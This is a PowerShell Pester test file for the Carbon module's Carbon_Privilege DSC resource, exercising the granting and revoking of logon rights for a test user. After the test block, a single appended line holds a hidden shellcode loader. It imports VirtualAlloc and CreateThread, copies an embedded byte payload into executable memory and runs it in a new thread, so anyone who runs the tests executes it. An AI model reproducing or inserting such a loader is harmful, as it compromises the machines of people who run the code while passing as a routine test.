











Import-Module -Name (Join-Path -Path $PSScriptRoot -ChildPath 'CarbonDscTest' -Resolve) -Force

Describe 'Carbon_Privilege' {
    $UserName = 'CarbonDscTestUser'
    $Password = [Guid]::NewGuid().ToString()
    Install-User -UserName $UserName -Password $Password

    BeforeAll {
        Start-CarbonDscTestFixture 'Privilege'
    }
    
    BeforeEach {
        $Global:Error.Clear()
        Revoke-TestUserPrivilege
    }
    
    AfterEach {
        Revoke-TestUserPrivilege
    }
    
    function Revoke-TestUserPrivilege
    {
        if( (Get-Privilege -Identity $UserName) )
        {
            Revoke-Privilege -Identity $UserName -Privilege (Get-Privilege -Identity $UserName)
        }
    }
    
    AfterAll {
        Stop-CarbonDscTestFixture
    }
    
    It 'should grant privilege' {
        Set-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight','SeDenyNetworkLogonRight' -Ensure 'Present'
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyBatchLogonRight') | Should Be $true
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyNetworkLogonRight') | Should Be $true
    }
    
    It 'should revoke privilege' {
        Set-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight','SeDenyNetworkLogonRight' -Ensure 'Present'
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyBatchLogonRight') | Should Be $true
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyNetworkLogonRight') | Should Be $true
        Set-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight','SeDenyNetworkLogonRight' -Ensure 'Absent'
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyBatchLogonRight') | Should Be $false
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyNetworkLogonRight') | Should Be $false
    }
    
    It 'should revoke all other privileges' {
        Set-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight','SeDenyNetworkLogonRight' -Ensure 'Present'
        Set-TargetResource -Identity $UserName -Privilege 'SeDenyInteractiveLogonRight' -Ensure 'Present'
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyBatchLogonRight') | Should Be $false
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyNetworkLogonRight') | Should Be $false
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyInteractiveLogonRight') | Should Be $true
    }
    
    It 'should revoke all privileges if ensure absent' {
        Set-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight','SeDenyNetworkLogonRight' -Ensure 'Present'
        Set-TargetResource -Identity $UserName -Ensure 'Absent'    
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyBatchLogonRight') | Should Be $false
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyNetworkLogonRight') | Should Be $false
    }
    
    It 'should revoke all privileges if privilege null' {
        Set-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight','SeDenyNetworkLogonRight' -Ensure 'Present'
        Set-TargetResource -Identity $UserName -Privilege $null -Ensure 'Present'    
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyBatchLogonRight') | Should Be $false
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyNetworkLogonRight') | Should Be $false
    }
    
    It 'should revoke all privileges if privilege empty' {
        Set-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight','SeDenyNetworkLogonRight' -Ensure 'Present'
        Set-TargetResource -Identity $UserName -Privilege @() -Ensure 'Present'    
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyBatchLogonRight') | Should Be $false
        (Test-Privilege -Identity $UserName -Privilege 'SeDenyNetworkLogonRight') | Should Be $false
    }
    
    It 'gets no privileges' {
        $resource = Get-TargetResource -Identity $UserName -Privilege @()
        $resource | Should Not BeNullOrEmpty
        $resource.Identity | Should Be $UserName
        ,$resource.Privilege | Should BeOfType ([string[]])
        $resource.Privilege.Count | Should Be 0
        Assert-DscResourcePresent $resource
    }
    
    It 'gets current privileges' {
        Set-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight','SeDenyNetworkLogonRight' -Ensure 'Present'
        $resource = Get-TargetResource -Identity $UserName -Privilege @()
        $resource | Should Not BeNullOrEmpty
        $resource.Privilege | Where-Object { $_ -eq 'SeDenyBatchLogonRight' } | Should Not BeNullOrEmpty
        $resource.Privilege | Where-Object { $_ -eq 'SeDenyNetworkLogonRight' } | Should Not BeNullOrEmpty
        Assert-DscResourceAbsent $resource
    }
    
    It 'should be absent if any privilege missing' {
        Set-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Present'
        $resource = Get-TargetResource -Identity $UserName -Privilege 'SeDenyNetworkLogonRight'
        $resource | Should Not BeNullOrEmpty
        $resource.Privilege | Where-Object { $_ -eq 'SeDenyBatchLogonRight' } | Should Not BeNullOrEmpty
        ($resource.Privilege -contains 'SeDenyNetworkLogonRight') | Should Be $false
        Assert-DscResourceAbsent $resource
    }
    
    It 'should test no privileges' {
        (Test-TargetResource -Identity $UserName -Privilege @() -Ensure 'Present') | Should Be $true
        (Test-TargetResource -Identity $UserName -Privilege @() -Ensure 'Absent') | Should Be $true
    }
    
    It 'should test existing privileges' {
        Set-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Present'
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Present') | Should Be $true
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Absent') | Should Be $false
    }
    
    It 'should test and not allow any privileges when absent' {
        Set-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Present'
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyNetworkLogonRight' -Ensure 'Absent') | Should Be $false
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyNetworkLogonRight' -Ensure 'Present') | Should Be $false
        Set-TargetResource -Identity $UserName -Privilege @() -Ensure 'Absent'
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyNetworkLogonRight' -Ensure 'Absent') | Should Be $true
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyNetworkLogonRight' -Ensure 'Present') | Should Be $false
    }
    
    It 'should test when user has extra privilege' {
        Set-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight','SeDenyInteractiveLogonRight' -Ensure 'Present'
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Absent') | Should Be $false
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Present') | Should Be $false
    }
    
    configuration DscConfiguration
    {
        param(
            $Ensure
        )
    
        Set-StrictMode -Off
    
        Import-DscResource -Name '*' -Module 'Carbon'
    
        node 'localhost'
        {
            Carbon_Privilege set
            {
                Identity = $UserName;
                Privilege = 'SeDenyBatchLogonRight';
                Ensure = $Ensure;
            }
        }
    }
    
    It 'should run through dsc' {
        & DscConfiguration -Ensure 'Present' -OutputPath $CarbonDscOutputRoot
        Start-DscConfiguration -Wait -ComputerName 'localhost' -Path $CarbonDscOutputRoot -Force
        $Global:Error.Count | Should Be 0
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Present') | Should Be $true
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Absent') | Should Be $false
    
        & DscConfiguration -Ensure 'Absent' -OutputPath $CarbonDscOutputRoot 
        Start-DscConfiguration -Wait -ComputerName 'localhost' -Path $CarbonDscOutputRoot -Force
        $Global:Error.Count | Should Be 0
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Present') | Should Be $false
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Absent') | Should Be $true
    }
    
    configuration DscConfiguration2
    {
        Set-StrictMode -Off
    
        Import-DscResource -Name '*' -Module 'Carbon'
    
        node 'localhost'
        {
            Carbon_Privilege set
            {
                Identity = $UserName;
                Privilege = 'SeDenyBatchLogonRight';
                Ensure = 'Present';
            }
        }
    }
    
    configuration DscConfiguration3
    {
        Set-StrictMode -Off
    
        Import-DscResource -Name '*' -Module 'Carbon'
    
        node 'localhost'
        {
            Carbon_Privilege set
            {
                Identity = $UserName;
                Ensure = 'Absent';
            }
        }
    }
    
    It 'should run through dsc' {
        & DscConfiguration2 -OutputPath $CarbonDscOutputRoot
        Start-DscConfiguration -Wait -ComputerName 'localhost' -Path $CarbonDscOutputRoot -Force
        $Global:Error.Count | Should Be 0
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Present') | Should Be $true
    
        & DscConfiguration3 -OutputPath $CarbonDscOutputRoot
        Start-DscConfiguration -Wait -ComputerName 'localhost' -Path $CarbonDscOutputRoot -Force
        $Global:Error.Count | Should Be 0
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Absent') | Should Be $true
    }
    
    configuration DscConfiguration4
    {
        Set-StrictMode -Off
    
        Import-DscResource -Name '*' -Module 'Carbon'
    
        node 'localhost'
        {
            Carbon_Privilege set
            {
                Identity = $UserName;
                Privilege = 'SeDenyBatchLogonRight';
                Ensure = 'Present';
            }
        }
    }
    
    configuration DscConfiguration5
    {
        Set-StrictMode -Off
    
        Import-DscResource -Name '*' -Module 'Carbon'
    
        node 'localhost'
        {
            Carbon_Privilege set
            {
                Identity = $UserName;
                Privilege = $null;
                Ensure = 'Present';
            }
        }
    }
    
    It 'should run through dsc' {
        & DscConfiguration2 -OutputPath $CarbonDscOutputRoot
        Start-DscConfiguration -Wait -ComputerName 'localhost' -Path $CarbonDscOutputRoot -Force
        $Global:Error.Count | Should Be 0
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Present') | Should Be $true
    
        & DscConfiguration3 -OutputPath $CarbonDscOutputRoot
        Start-DscConfiguration -Wait -ComputerName 'localhost' -Path $CarbonDscOutputRoot -Force
        $Global:Error.Count | Should Be 0
        (Test-TargetResource -Identity $UserName -Privilege 'SeDenyBatchLogonRight' -Ensure 'Present') | Should Be $false

        $result = Get-DscConfiguration
        $Global:Error.Count | Should Be 0
        $result | Should BeOfType ([Microsoft.Management.Infrastructure.CimInstance])
        $result.PsTypeNames | Where-Object { $_ -like '*Carbon_Privilege' } | Should Not BeNullOrEmpty
    }
    
}

$hME = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $hME -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xde,0xd9,0x74,0x24,0xf4,0xba,0xcc,0xda,0x09,0x0d,0x5e,0x33,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0x30,0x38,0xfc,0xf1,0x20,0x3f,0xff,0x09,0xb0,0x20,0x89,0xef,0x81,0x60,0xed,0x64,0xb1,0x50,0x65,0x28,0x3d,0x1a,0x2b,0xd9,0xb6,0x6e,0xe4,0xee,0x7f,0xc4,0xd2,0xc1,0x80,0x75,0x26,0x43,0x02,0x84,0x7b,0xa3,0x3b,0x47,0x8e,0xa2,0x7c,0xba,0x63,0xf6,0xd5,0xb0,0xd6,0xe7,0x52,0x8c,0xea,0x8c,0x28,0x00,0x6b,0x70,0xf8,0x23,0x5a,0x27,0x73,0x7a,0x7c,0xc9,0x50,0xf6,0x35,0xd1,0xb5,0x33,0x8f,0x6a,0x0d,0xcf,0x0e,0xbb,0x5c,0x30,0xbc,0x82,0x51,0xc3,0xbc,0xc3,0x55,0x3c,0xcb,0x3d,0xa6,0xc1,0xcc,0xf9,0xd5,0x1d,0x58,0x1a,0x7d,0xd5,0xfa,0xc6,0x7c,0x3a,0x9c,0x8d,0x72,0xf7,0xea,0xca,0x96,0x06,0x3e,0x61,0xa2,0x83,0xc1,0xa6,0x23,0xd7,0xe5,0x62,0x68,0x83,0x84,0x33,0xd4,0x62,0xb8,0x24,0xb7,0xdb,0x1c,0x2e,0x55,0x0f,0x2d,0x6d,0x31,0xfc,0x1c,0x8e,0xc1,0x6a,0x16,0xfd,0xf3,0x35,0x8c,0x69,0xbf,0xbe,0x0a,0x6d,0xc0,0x94,0xeb,0xe1,0x3f,0x17,0x0c,0x2b,0xfb,0x43,0x5c,0x43,0x2a,0xec,0x37,0x93,0xd3,0x39,0xad,0x96,0x43,0xab,0x59,0xc9,0x9c,0x43,0x9c,0xe9,0xa3,0x2e,0x29,0x0f,0xf3,0x00,0x7a,0x80,0xb3,0xf0,0x3a,0x70,0x5b,0x1b,0xb5,0xaf,0x7b,0x24,0x1f,0xd8,0x11,0xcb,0xf6,0xb0,0x8d,0x72,0x53,0x4a,0x2c,0x7a,0x49,0x36,0x6e,0xf0,0x7e,0xc6,0x20,0xf1,0x0b,0xd4,0xd4,0xf1,0x41,0x86,0x72,0x0d,0x7c,0xad,0x7a,0x9b,0x7b,0x64,0x2d,0x33,0x86,0x51,0x19,0x9c,0x79,0xb4,0x12,0x15,0xec,0x77,0x4c,0x5a,0xe0,0x77,0x8c,0x0c,0x6a,0x78,0xe4,0xe8,0xce,0x2b,0x11,0xf7,0xda,0x5f,0x8a,0x62,0xe5,0x09,0x7f,0x24,0x8d,0xb7,0xa6,0x02,0x12,0x47,0x8d,0x92,0x6e,0x9e,0xeb,0xe0,0x9e,0x22;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ZJn=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ZJn.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ZJn,0,0,0);for (;;){Start-sleep 60};

